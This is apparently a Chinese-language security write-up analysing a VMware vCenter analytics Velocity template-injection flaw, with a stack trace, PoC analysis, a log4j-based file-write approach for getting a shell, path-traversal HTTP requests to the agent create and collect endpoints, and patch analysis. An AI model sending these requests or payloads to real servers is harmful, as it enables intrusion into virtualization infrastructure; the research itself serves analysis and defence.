    applyItemMappings:85, ResultSetToCdfPayloadMapping (com.vmware.ph.phservice.collector.internal.cdf.mapping)
    map:62, ResultSetToCdfPayloadMapping (com.vmware.ph.phservice.collector.internal.cdf.mapping)
    map:26, ResultSetToCdfPayloadMapping (com.vmware.ph.phservice.collector.internal.cdf.mapping)
    map:36, IndependentResultsMapping (com.vmware.ph.phservice.collector.internal.cdf.mapping)
    map:17, IndependentResultsMapping (com.vmware.ph.phservice.collector.internal.cdf.mapping)
    map:109, QueryServiceCdfCollector$NamedQueryResultSetToCollectedPayloadMapping (com.vmware.ph.phservice.collector.internal.cdf)
    map:87, QueryServiceCdfCollector$NamedQueryResultSetToCollectedPayloadMapping (com.vmware.ph.phservice.collector.internal.cdf)
    apply:124, QueryServiceCollector$ResultIteratorFactory$2 (com.vmware.ph.phservice.collector.internal.data)
    apply:121, QueryServiceCollector$ResultIteratorFactory$2 (com.vmware.ph.phservice.collector.internal.data)
    transform:799, Iterators$8 (com.google.common.collect)
    next:48, TransformedIterator (com.google.common.collect)
    next:48, TransformedIterator (com.google.common.collect)
    next:558, Iterators$5 (com.google.common.collect)
    next:558, Iterators$5 (com.google.common.collect)
    processStructuredDataCollectors:261, UsageDataCollector (com.vmware.ph.phservice.collector.internal.core)
    collectAndUpload:172, UsageDataCollector (com.vmware.ph.phservice.collector.internal.core)
    collect:127, UsageDataCollector (com.vmware.ph.phservice.collector.internal.core)
    collectAndSend:160, SpecsCollector (com.vmware.ph.phservice.cloud.dataapp.internal.collector)
    collect:91, SpecsCollector (com.vmware.ph.phservice.cloud.dataapp.internal.collector)
    collect:40, ConnectionClosingCollectorWrapper (com.vmware.ph.phservice.collector.internal.core)
    collect:337, DefaultCollectorDataAppAgent (com.vmware.ph.phservice.cloud.dataapp.internal.collector)
    collect:55, BaseCollectorDataAppAgentWrapper (com.vmware.ph.phservice.cloud.dataapp.internal.collector)
    access$201:22, PermitControlledCollectorDataAppAgentWrapper (com.vmware.ph.phservice.cloud.dataapp.internal.collector)
    call:89, PermitControlledCollectorDataAppAgentWrapper$3 (com.vmware.ph.phservice.cloud.dataapp.internal.collector)
    call:87, PermitControlledCollectorDataAppAgentWrapper$3 (com.vmware.ph.phservice.cloud.dataapp.internal.collector)
    executeWithPermit:112, PermitControlledCollectorDataAppAgentWrapper (com.vmware.ph.phservice.cloud.dataapp.internal.collector)
    collect:86, PermitControlledCollectorDataAppAgentWrapper (com.vmware.ph.phservice.cloud.dataapp.internal.collector)
    collect:55, BaseCollectorDataAppAgentWrapper (com.vmware.ph.phservice.cloud.dataapp.internal.collector)
    collect:55, BaseCollectorDataAppAgentWrapper (com.vmware.ph.phservice.cloud.dataapp.internal.collector)
    collect:55, BaseCollectorDataAppAgentWrapper (com.vmware.ph.phservice.cloud.dataapp.internal.collector)
    call:213, DataAppAgentController$3 (com.vmware.ph.phservice.cloud.dataapp.server)
    call:204, DataAppAgentController$3 (com.vmware.ph.phservice.cloud.dataapp.server)
    run:332, WebAsyncManager$5 (org.springframework.web.context.request.async)
    call:511, Executors$RunnableAdapter (java.util.concurrent)
    run:266, FutureTask (java.util.concurrent)
    runWorker:1149, ThreadPoolExecutor (java.util.concurrent)
    run:624, ThreadPoolExecutor$Worker (java.util.concurrent)
    run:748, Thread (java.lang)
新的 Velocity 版本有一些黑名单来阻止对“java.lang.Class”类方法的调用,就看上下文是否有一些变量存在操作空间。  
### velocity poc分析
所以看是否可以通过velocity执行命令或上传文件
    #set($modelKey = $LOCAL-resourceItem.resourceItem.getKey())##
    #set($objectId = "vim.ServiceInstance:$modelKey.value:$modelKey.serverGuid")##
    #set($obj = $LOCAL-cdf20Result.newObject("vim.ServiceInstance", $objectId))##
    $obj.addProperty("OSTYPE", "VMware can't steal this PoC")##
    $obj.addProperty("BUILD", $content-about-build)##
    $obj.addProperty("VERSION", $content-about-version)##
上面是公开的poc,只会回显一些系统属性，`$LOCAL-resourceItem`、`$content-about-build`、`$content-about-version`都是context里已有的变量。  
这里通过调试获取context里的属性做测试，测试代码如下
    Field contextF = Class.forName("org.apache.velocity.VelocityContext").getDeclaredField("context");
    contextF.setAccessible(true);
    HashMap m = (HashMap) contextF.get(this.velocityInvocationContext.velocityContext);
    NamedPropertiesResourceItem namedPropertiesResourceItem = (NamedPropertiesResourceItem) m.get("LOCAL-resourceItem");
    namedPropertiesResourceItem.getResourceItem().getKey();
$LOCAL-resourceItem.resourceItem.getKey()，这里使用了两种方式获取对象属性，getKey()就是对象自带的方法，而如果是resourceItem，就会自动调用getResourceItem()来获取属性，毕竟`_resourceItem`是私有属性，没法直接获取。  
从第二行的`$modelKey.value:$modelKey.serverGuid`也能看出  
所以改成这样也是可以执行的  
或  
$LOCAL-cdf20Result变量可获取VelocityJsonLd，该类最终会转换成返回的json数据。  
    VelocityHelper.executeVelocityExpression("#set($modelKey = $LOCAL-resourceItem.resourceItem.getKey())##\n" +
                    "#set($objectId = \"vim.ServiceInstance:$modelKey.value:$modelKey.serverGuid\")##\n" +
                    "#set($obj = $LOCAL-cdf20Result.newObject(\"vim.ServiceInstance\", $objectId))##\n" +
                    "$obj.addProperty(\"OSTYPE\", \"VMware can't steal this PoC\")##\n" +
                    "$obj.addProperty(\"BUILD\", $content-about-build)##\n" +
                    "$obj.addProperty(\"VERSION\", $content-about-version)##", this.velocityInvocationContext.velocityEngine, this.velocityInvocationContext.velocityContext, logTag);
    this.velocityInvocationContext.velocityJsonLd.object;
转换成json返回  
### velocity GLOBAL-logger利用构造
既然已经清楚了poc是怎么构造的，那么如何getshell，自然是从context里已有的变量里下手，其中注意到有个`GLOBAL-logger`,是log4j的实例，之前分析的漏洞点就是通过log4j写文件的。  
我们调试下看看效果，先尝试获取该变量。  
log4j的配置文件路径/etc/vmware-analytics/log4j.properties，log4j日志路径在配置文件里写死了。  
然后查一下log4j运行时怎么修改日志路径。  
[https://www.cnblogs.com/xiaohu-v587/p/8463814.html](https:_www.cnblogs.com_xiaohu-v587_p_8463814)  
当然这个代码是log4j里的，和common-logging包里的还有些差别，但问题不大，可参考这个编写velocity代码。  
成功写入  
另外简单看了上下文其他几个变量，也没有利用点，如果有大佬发现可一起讨论。
## 漏洞验证
返回201，createAgent接口存在，并且创建agent成功，每次请求需要修改X-Plugin-Type
    POST /analytics/ceip/sdk/..;/..;/..;/analytics/ph/api/dataapp/agent?_c=vSphere.vapi.6_7&_i=9D36C850-1612-4EC4-B8DD-50BA239A25BB HTTP/1.1
    Host: 192.168.111.11
    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
    Content-Length: 2
    Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
    Content-Type: application/json
    X-Deployment-Secret: secret
    X-Plugin-Type: MoWtrXYtWo
    Accept-Encoding: gzip, deflate
    Connection: close
    {}
返回200，collectAgent接口存在，每次请求需要修改X-Plugin-Type
    POST /analytics/ceip/sdk/..;/..;/..;/analytics/ph/api/dataapp/agent?action=collect&_c=vSphere.vapi.6_7&_i=9D36C850-1612-4EC4-B8DD-50BA239A25BB HTTP/1.1
    Host: 192.168.111.11
    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
    Content-Length: 2
    Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
    Content-Type: application/json
    X-Deployment-Secret: secret
    X-Plugin-Type: MoWtrXYtWo
    Accept-Encoding: gzip, deflate
    Connection: close
    {}
## 漏洞利用
createAgent  
每次请求修改X-Plugin-Type
    POST /analytics/ceip/sdk/..;/..;/..;/analytics/ph/api/dataapp/agent?_c=vSphere.vapi.6_7&_i=9D36C850-1612-4EC4-B8DD-50BA239A25BB HTTP/1.1
    Host: 192.168.111.11
    Connection: close
    Accept-Encoding: gzip, deflate
    Accept: */*
    User-Agent: Mozilla/5.0
    Cache-Control: max-age=0
    Upgrade-Insecure-Requests: 1
    Content-Type: application/json
    X-Deployment-Secret: secret
    X-Plugin-Type: test
    Content-Length: 354
    {"manifestSpec": {"resourceId": "b1", "dataType": "b2", "objectId": "b3", "versionDataType": "b4", "versionObjectId": "b5"}, "objectType": "a1", "collectionTriggerDataNeeded": true, "deploymentDataNeeded": true, "resultNeeded": true, "signalCollectionCompleted": true, "localManifestPath": "a2", "localPayloadPath": "a3", "localObfuscationMapPath": "a4"}
collectAgent  
获取信息
    POST /analytics/ceip/sdk/..;/..;/..;/analytics/ph/api/dataapp/agent?action=collect&_c=vSphere.vapi.6_7&_i=9D36C850-1612-4EC4-B8DD-50BA239A25BB HTTP/1.1
    Host: 192.168.111.11
    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
    Content-Length: 2065
    Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
    Content-Type: application/json
    X-Deployment-Secret: secret
    X-Plugin-Type: BafwKlMbWp
    Accept-Encoding: gzip, deflate
    Connection: close
    {"manifestContent": "\n   \n      \n         \n            ServiceInstance\n         \n         \n            content.about.instanceUuid\n            content.about.osType\n            content.about.build\n            content.about.version\n         \n      \n   \n   \n      \n         \n            \n               vir:VCenter\n               \n                  \n                     \n                        ServiceInstance\n                     \n                     \n                     \n                  \n               \n            \n         \n      \n   \n   \n      \n         \n            vir:VCenter\n         \n      \n   \n", "contextData": "a2", "objectId": "a3"}
最后编写利用，效果如下  
## 补丁分析
DataAppAgentController的每个方法里其实都会调用DataAppAgentId，之前的补丁分析这个类有做一个id过滤，而这里其实没做其他改动，只是多一个IncorrectFormat异常捕捉。所以之前的DataAppAgentId补丁和processTelemetry是没有关系的。  
而存在漏洞的collect接口被直接删除掉了。